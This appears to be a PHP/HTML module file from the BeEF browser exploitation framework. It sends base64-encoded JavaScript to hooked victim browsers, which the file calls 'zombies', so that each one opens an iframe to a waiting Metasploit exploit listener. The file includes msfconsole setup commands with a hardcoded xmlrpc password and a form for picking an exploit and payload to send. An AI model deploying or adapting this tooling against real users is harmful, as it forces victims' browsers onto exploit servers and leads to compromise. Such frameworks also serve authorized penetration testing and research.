<?php
        // Copyright (c) 2009, Ryan Linn (sussurro@happypacket.net)
        // All Rights Reserved
        // Template for code by:
        // wade@bindshell.net - http://www.bindshell.net


	require_once("../../../include/common.inc.php"); // included for get_b64_file()
	DEFINE('JS_FILE', './template.js');
	
?>

<!--

BeEF: the following is the boiler plate from the exploit

-->
<script language="javascript" type="text/javascript">
	var rtnval = "OK Clicked";

	Element.Methods.construct_code = function($url) {

		// javascript is loaded from a file - it could be hard coded
		var b64code = '<?php echo get_b64_file(JS_FILE); ?>';
		b64code = b64replace(b64code, "URL",$url);

		// send the code to the zombies
		do_send(b64code);
	}

	// add construct code to DOM
	Element.addMethods();
	
</script>

<!-- PAGE CONTENT -->
<div id="module_header">Metasploit Browser Exploits</div>
This module creates a Metasploit listener using a backend server, and then sends the client 
code which creates an iframe connecting to the waiting exploit.<br><br>
Setup MSF to allow BeEF access (settings in /beef/ui/msf.php):<br>

<pre>
    sudo ./msfconsole
    msf > load xmlrpc Pass=BeEFMSFPass
</pre>
<div id="module_subsection">
	<form name="myform" id="myform">
		<div id="module_subsection_header">Exploit</div>
		<div id="exploits">
			<select name="" id="loading" onChange="">
				<option value="">Loading...</option>
			</select>
		</div>
		<div id="module_subsection_header">Payload</div>
		<div id="payloads">
			<select name="" id="loading" onChange="">
				<option value="">Loading...</option>
			</select>
		</div>
		<div id="options">Loading...</div>
		<input class="button" type="button" value=" Send Now " onClick="javascript:msf_execute_module()"/>
	</form>
</div>

<script>
	// init pane
	msf_get_exploit_list();
</script>
